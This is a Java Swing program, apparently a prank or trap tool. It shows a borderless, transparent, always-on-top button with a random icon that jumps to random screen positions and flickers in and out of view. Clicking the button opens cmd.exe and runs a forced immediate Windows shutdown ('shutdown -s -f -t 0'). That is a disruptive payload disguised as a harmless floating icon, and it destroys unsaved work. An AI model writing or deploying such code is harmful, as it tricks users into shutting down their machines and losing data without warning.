import javax.imageio.ImageIO;
import javax.swing.*;
import javax.xml.transform.Source;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.awt.image.ImageObserver;
import java.awt.image.ImageProducer;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URL;
import java.util.Random;
import java.util.Vector;

public class Main {
    public static void main(String[] args) {LetterBox letterBox = new LetterBox();}
}

class LetterBox extends JFrame implements Runnable{

    int x,y;
    Dimension screenSize;
    Random random;

    public LetterBox() {
        screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        random = new Random();
        this.setSize(new Dimension(65,100));
        this.setTitle("");
        this.setLocation(0,0);
        this.setResizable(false);
        this.setUndecorated(true);
        this.setBackground(new Color(0,0,0,0));
        this.setAlwaysOnTop(true);
        this.add(Letters());
        this.setVisible(true);
        Thread t = new Thread(this);
        t.start();
    }

    public JButton Letters() {
        Vector<ImageIcon> icons = new Vector<>();
        URL imgURL1 = getClass().getClassLoader().getResource("icon1.png");
        icons.add(new ImageIcon(imgURL1));
        URL imgURL2 = getClass().getClassLoader().getResource("icon2.png");
        icons.add(new ImageIcon(imgURL2));
        URL imgURL3 = getClass().getClassLoader().getResource("icon3.png");
        icons.add(new ImageIcon(imgURL3));

        Random random = new Random();
        JButton button = new JButton();
        button.setIcon(icons.get(random.nextInt(3)));
        button.setContentAreaFilled(false);
        button.setFocusPainted(false);
        button.setBorderPainted(false);
        button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                Runtime runtime = Runtime.getRuntime();
                try {
                    System.out.println("눌려짐");
                    Process process = runtime.exec("C:\\WINDOWS\\system32\\cmd.exe");
                    OutputStream os = process.getOutputStream();
                    os.write("shutdown -s -f -t 0 \n \r".getBytes());
                    os.close();
                    process.waitFor();
                    System.out.println("작동 완료");
                } catch (IOException | InterruptedException ex) {
                    System.out.println("오류가 발생하였습니다.");
                    System.exit(1);
                }
            }
        });
        return button;
    }

    @Override
    public void run() {
        while(true) {
            try {
                ChangePosition();
                Thread.sleep(30000);
                ChangeVisible();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public void ChangeVisible(){this.setVisible(random.nextBoolean());}

    public void ChangePosition(){
        x = random.nextInt(screenSize.width);
        y = random.nextInt(screenSize.height);
        this.setLocation(x,y);
    }
}